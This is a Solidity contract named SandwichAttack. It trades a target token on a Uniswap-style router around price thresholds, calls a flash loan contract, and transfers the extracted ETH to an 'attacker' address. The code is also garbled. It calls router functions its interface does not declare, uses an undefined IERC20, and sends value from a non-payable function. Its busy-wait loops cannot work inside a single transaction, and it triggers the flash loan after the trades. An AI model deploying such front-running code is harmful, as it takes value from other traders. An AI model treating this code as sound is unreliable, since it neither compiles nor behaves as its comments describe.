pragma solidity ^0.8.0;

interface IUniswapV2Router02 {
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

contract SandwichAttack {
    IUniswapV2Router02 public uniswapRouter;
    address public targetToken;
    address public flashLoanContract;
    address public attacker;

    constructor(address _uniswapRouter, address _targetToken, address _flashLoanContract, address _attacker) {
        uniswapRouter = IUniswapV2Router02(_uniswapRouter);
        targetToken = _targetToken;
        flashLoanContract = _flashLoanContract;
        attacker = _attacker;
    }

    function executeSandwichAttack(uint amount) public {
        // Get the current price of the target token
        uint[] memory amounts = uniswapRouter.getAmountsOut(amount, getPathForTokenToToken(targetToken));
        uint currentPrice = amounts[amounts.length - 1];

        // Calculate the desired price range for the sandwich attack
        uint desiredPriceLowerBound = currentPrice - (currentPrice / 10);
        uint desiredPriceUpperBound = currentPrice + (currentPrice / 10);

        // Place a buy order for the target token on Uniswap
        uint deadline = block.timestamp + 300; // 5 minute deadline
        uniswapRouter.swapExactETHForTokens{ value: amount }(0, getPathForETHToToken(targetToken), address(this), deadline);

        // Wait for the price to reach the desired lower bound
        while (getCurrentPrice() < desiredPriceLowerBound) {}

        // Place a sell order for the target token on Uniswap
        uint targetTokenBalance = IERC20(targetToken).balanceOf(address(this));
        IERC20(targetToken).approve(address(uniswapRouter), targetTokenBalance);
        uniswapRouter.swapExactTokensForETH(targetTokenBalance, 0, getPathForTokenToETH(targetToken), address(this), deadline);

        // Trigger the flash loan
        IFlashLoan(flashLoanContract).executeFlashLoan(amount, targetToken);

        // Place a buy order for the target token on Uniswap
        uniswapRouter.swapExactETHForTokens{ value: amount }(0, getPathForETHToToken(targetToken), address(this), deadline);

        // Wait for the price to reach the desired upper bound
        while (getCurrentPrice() > desiredPriceUpperBound) {}

        // Place a sell order for the target token on Uniswap
        targetTokenBalance = IERC20(targetToken).balanceOf(address(this));
        IERC20(targetToken).approve(address(uniswapRouter), targetTokenBalance);
        uniswapRouter.swapExactTokensForETH(targetTokenBalance, 0, getPathForTokenToETH(targetToken), address(this), deadline);

        // Send the extracted MEV to the attacker
        address payable attackerPayable = payable(attacker);
        attackerPayable.transfer(address(this).balance);
    }

    function getCurrentPrice() public view returns (uint) {
        uint[] memory amounts = uniswapRouter.getAmountsOut(1 ether, getPathForTokenToToken(targetToken));
        return amounts[amounts.length - 1];
    }

    function getPathForETHToToken(address token) private view returns (address[] memory) {
        address[] memory path = new address[](2);
        path[0] = uniswapRouter.WETH();
        path[1] = token;
        return path;
    }

    function getPathForTokenToETH(address token) private view returns (address[] memory) {
        address[] memory path = new address[](2);
        path[0] = token;
        path[1] = uniswapRouter.WETH();
        return path;
    }

    function getPathForTokenToToken(address token) private view returns (address[] memory) {
        address[] memory path = new address[](2);
        path[0] = token;
        path[1] = uniswapRouter.WETH();
        return path;
    }
}

interface IFlashLoan {
    function executeFlashLoan(uint amount, address token) external;
}
